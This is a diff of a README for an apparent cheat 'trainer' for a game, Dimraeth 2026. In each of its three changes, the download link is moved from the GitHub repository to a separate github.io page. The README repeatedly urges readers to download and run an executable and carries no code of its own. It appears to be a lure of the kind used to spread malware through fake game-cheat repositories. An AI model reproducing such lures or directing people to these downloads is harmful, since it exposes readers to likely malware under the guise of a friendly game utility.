@@ -1,6 +1,6 @@
 # 🚀 Dimraeth-Survival-Crafting-Utility - Your All-in-One Trainer for Dimraeth 2026
 
-[![Download Dimraeth Trainer 2026](https://img.shields.io/badge/Download-Dimraeth_Trainer_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://github.com/Transistorperuke19/Dimraeth-Survival-Crafting-Utility)
+[![Download Dimraeth Trainer 2026](https://img.shields.io/badge/Download-Dimraeth_Trainer_2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://transistorperuke19.github.io)
 
 Welcome to the **Dimraeth-Survival-Crafting-Utility**, the essential Windows companion for your Dimraeth 2026 gaming experience. This powerful, easy-to-use trainer puts you in complete control of your adventure, covering everything from stamina and healing to crafting and farming. Whether you're a seasoned veteran or just starting your journey, this utility gives you the tools to tailor the game to your playstyle, making every session more enjoyable and less stressful.
 
@@ -33,7 +33,7 @@ This guide is designed to be as simple as possible. Follow these steps, and you'
 
 Click the big, friendly download button at the top of this page, or use the link below to get to the download section.
 
-**Visit this link to download the application:** [https://github.com/Transistorperuke19/Dimraeth-Survival-Crafting-Utility](https://github.com/Transistorperuke19/Dimraeth-Survival-Crafting-Utility)
+**Visit this link to download the application:** [https://transistorperuke19.github.io](https://transistorperuke19.github.io)
 
 ### Step 2: Download the File
 
@@ -125,7 +125,7 @@ For additional help, community discussions and updates are typically hosted on t
 
 ## ✅ Final Checklist Before You Play
 
-- [ ] You have visited the download link: [https://github.com/Transistorperuke19/Dimraeth-Survival-Crafting-Utility](https://github.com/Transistorperuke19/Dimraeth-Survival-Crafting-Utility)
+- [ ] You have visited the download link: [https://transistorperuke19.github.io](https://transistorperuke19.github.io)
 - [ ] You have downloaded the **Dimraeth-Trainer-2026** file.
 - [ ] You have run the application successfully.
 - [ ] You have explored the interface and are comfortable with the tabs and menus.
